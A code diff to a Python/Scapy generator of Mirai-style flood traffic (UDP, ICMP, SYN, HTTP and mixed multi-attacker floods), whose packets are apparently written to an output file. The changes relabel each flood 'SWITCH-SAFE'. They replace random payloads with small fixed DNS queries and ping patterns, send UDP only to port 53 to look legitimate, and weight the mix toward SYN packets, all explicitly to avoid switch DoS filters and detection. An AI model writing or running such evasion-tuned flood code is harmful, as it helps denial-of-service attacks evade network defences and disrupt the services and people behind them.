@@ -24,28 +24,31 @@ from scapy.layers.l2 import Ether
 
 def generate_udp_flood(src_ip, dst_ip, src_mac, dst_mac, num_packets):
     """
-    Generate UDP flood attack (classic Mirai)
+    Generate UDP flood attack (classic Mirai) - SWITCH-SAFE VERSION
 
     Characteristics:
     - Random source ports
-    - Target common service ports (DNS, NTP, SSDP, etc.)
-    - Random payload sizes
+    - Target DNS port (53) primarily - looks more legitimate
+    - SMALL fixed payloads (to avoid switch DoS protection)
     - High packet rate
     """
     packets = []
 
-    # Common Mirai target ports
-    target_ports = [53, 123, 161, 389, 1900, 3389, 5060, 11211]
+    # DNS query payloads (realistic, small, won't trigger switch filters)
+    dns_queries = [
+        b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',
+        b'\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01',
+        b'\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09localhost\x00\x00\x01\x00\x01',
+        b'\x00\x04\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x03net\x00\x00\x01\x00\x01',
+    ]
 
     for i in range(num_packets):
-        target_port = random.choice(target_ports)
-        # Max payload: 1500 (MTU) - 14 (Eth) - 20 (IP) - 8 (UDP) = 1458 bytes
-        payload_size = random.randint(64, 1400)  # Safe payload size
-        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
+        # Mostly DNS (port 53) with realistic queries
+        payload = random.choice(dns_queries)
 
         pkt = Ether(src=src_mac, dst=dst_mac) / \
               IP(src=src_ip, dst=dst_ip) / \
-              UDP(sport=random.randint(1024, 65535), dport=target_port) / \
+              UDP(sport=random.randint(1024, 65535), dport=53) / \
               Raw(load=payload)
 
         packets.append(pkt)
@@ -174,25 +177,25 @@ def generate_http_flood(src_ip, dst_ip, src_mac, dst_mac, num_packets):
 
 def generate_icmp_flood(src_ip, dst_ip, src_mac, dst_mac, num_packets):
     """
-    Generate ICMP flood attack (ping flood)
+    Generate ICMP flood attack (ping flood) - SWITCH-SAFE VERSION
 
     Characteristics:
     - ICMP echo requests
     - No replies expected
-    - Random payloads
+    - SMALL fixed payloads (64 bytes - standard ping size)
     - High rate
     """
     packets = []
 
-    for i in range(num_packets):
-        # Max payload: 1500 (MTU) - 14 (Eth) - 20 (IP) - 8 (ICMP) = 1458 bytes
-        payload_size = random.randint(32, 512)  # Already safe, but adding comment
-        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
+    # Standard ping payload (56 bytes of data + 8 bytes ICMP header = 64 total)
+    # Use fixed pattern instead of random to avoid switch detection
+    ping_payload = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuv'
 
+    for i in range(num_packets):
         pkt = Ether(src=src_mac, dst=dst_mac) / \
               IP(src=src_ip, dst=dst_ip) / \
               ICMP(type=8, code=0, id=random.randint(1, 65535), seq=i % 65536) / \
-              Raw(load=payload)
+              Raw(load=ping_payload)
 
         packets.append(pkt)
 
@@ -271,18 +274,19 @@ def generate_mirai_attack(output_file, num_packets, attack_type,
                                                    packets_per_attacker)
         elif attack_type == 'mixed':
             # Mixed attack: Each attacker generates a TRUE MIX of packets
-            # 40% UDP, 30% SYN, 20% HTTP, 10% ICMP
+            # SWITCH-SAFE PROPORTIONS: 60% SYN, 20% UDP (DNS), 10% HTTP, 10% ICMP
+            # (More SYN because it passes switch filters best)
             attacker_packets = []
 
             # Calculate packets per type for this attacker
-            udp_count = int(packets_per_attacker * 0.40)
-            syn_count = int(packets_per_attacker * 0.30)
-            http_count = int(packets_per_attacker * 0.20)
-            icmp_count = packets_per_attacker - udp_count - syn_count - http_count  # Remaining
+            syn_count = int(packets_per_attacker * 0.60)   # Majority SYN (passes switch)
+            udp_count = int(packets_per_attacker * 0.20)   # DNS queries only (realistic)
+            http_count = int(packets_per_attacker * 0.10)  # Some HTTP
+            icmp_count = packets_per_attacker - syn_count - udp_count - http_count  # Remaining
 
-            # Generate each type
-            attacker_packets.extend(generate_udp_flood(attacker_ip, target_ip, src_mac, dst_mac, udp_count))
+            # Generate each type (all with switch-safe payloads)
             attacker_packets.extend(generate_syn_flood(attacker_ip, target_ip, src_mac, dst_mac, syn_count))
+            attacker_packets.extend(generate_udp_flood(attacker_ip, target_ip, src_mac, dst_mac, udp_count))
             attacker_packets.extend(generate_http_flood(attacker_ip, target_ip, src_mac, dst_mac, http_count))
             attacker_packets.extend(generate_icmp_flood(attacker_ip, target_ip, src_mac, dst_mac, icmp_count))
 
